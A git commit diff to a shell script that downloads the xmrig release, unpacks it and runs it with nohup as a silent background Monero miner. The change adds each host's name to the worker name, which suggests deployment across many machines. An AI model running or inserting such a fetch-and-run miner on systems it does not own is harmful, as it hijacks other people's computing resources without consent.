657fa6769a0f19f741962e01455e9fbc95e27e3d
caippx <37325838+caippx@users.noreply.github.com>
2022-03-11 17:47:27 +0800

    Update wk_2.sh

--- drfytgybhunjoimkol/wk_2.sh
+++ drfytgybhunjoimkol/wk_2.sh
@@ -6,4 +6,4 @@ wget -O ~/wk/xmrig-6.16.4-linux-x64.tar.gz https://github.com/xmrig/xmrig/releas
 cd wk && tar -zxvf xmrig-6.16.4-linux-x64.tar.gz
 cd xmrig-6.16.4 && chmod +x xmrig
 hostname=`hostname`
-nohup ./xmrig -o pool.minexmr.com:4444 -u ${WALLET} -p ${hostname} -k --coin monero -a rx/0 > ~/wk/wk.log 2>&1 &
+nohup ./xmrig -o pool.minexmr.com:4444 -u ${WALLET}.${hostname} -p ${hostname} -k --coin monero -a rx/0 > ~/wk/wk.log 2>&1 &
